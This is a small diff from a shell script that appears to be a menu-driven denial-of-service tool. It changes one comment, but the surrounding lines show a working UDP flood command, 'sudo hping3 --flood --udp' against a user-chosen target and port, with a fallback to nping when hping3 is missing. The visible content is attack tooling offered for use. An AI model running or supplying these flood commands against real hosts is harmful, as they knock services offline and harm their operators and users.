@@ -28,7 +28,7 @@ if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
 		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
 	fi
-## No hping3 so using nping for instead
+## No hping3 so using nping for UDP Flood instead
 	else echo "hping3 not found :( trying nping instead"
 		echo ""
 		echo "Trying UDP Flood with nping.."
